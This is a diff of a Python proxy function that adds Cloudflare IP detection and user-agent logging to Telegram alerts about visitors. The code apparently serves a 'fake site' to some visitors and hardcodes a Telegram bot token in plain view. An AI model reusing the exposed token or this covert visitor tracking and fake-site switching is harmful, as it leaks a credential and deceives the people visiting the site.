@@ -1325,8 +1325,8 @@ def proxy_master_final(path):
     
     # [V4.29] Security Gate (Hacker Trap)
     # Block WordPress scanners and script kiddies
+    client_ip = request.headers.get('CF-Connecting-IP', request.headers.get('X-Forwarded-For', request.remote_addr))
     if any(fp in clean_path for fp in FORBIDDEN_PATHS):
-        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         
         # 1. Fire Alert
         try:
@@ -1351,8 +1351,8 @@ def proxy_master_final(path):
         # [V4.27] Telegram Alert (Fire & Forget)
         try:
             # 1. User Info
-            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-            msg = f"🔔 <b>[접속 감지]</b>\n키워드: {kr_keyword}\nIP: {client_ip}\nSlug: {keyword_slug}"
+            client_ip = request.headers.get('CF-Connecting-IP', request.headers.get('X-Forwarded-For', request.remote_addr))
+            msg = f"🔔 <b>[접속 감지]</b>\n키워드: {kr_keyword}\nIP: {client_ip}\nUA: {user_agent[:50]}...\nSlug: {keyword_slug}"
             
             # 2. Send Alert (Timeout 1s to prevent lag)
             # Token: 7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0
@@ -1375,7 +1375,7 @@ def proxy_master_final(path):
         
         # [V4.27] Telegram Alert (Fire & Forget)
         try:
-            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+            client_ip = request.headers.get('CF-Connecting-IP', request.headers.get('X-Forwarded-For', request.remote_addr))
             t_param = request.args.get('t', 'A')
             vendor_name = "B-모두클린" if t_param == 'B' else "A-이사방"
             full_url = request.url
@@ -1383,7 +1383,7 @@ def proxy_master_final(path):
             # Create bypass link for viewing fake site
             bypass_url = full_url + ("&" if "?" in full_url else "?") + "bypass=1"
             
-            msg = f"{vendor_name}\n키워드: {kr_keyword}\nIP: {client_ip}\n👁️ 가짜사이트: {bypass_url}"
+            msg = f"{vendor_name}\n키워드: {kr_keyword}\nIP: {client_ip}\n가면(UA): {user_agent[:30]}...\n👁️ 가짜사이트: {bypass_url}"
             
             requests.get(
                 f"https://api.telegram.org/bot7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0/sendMessage",
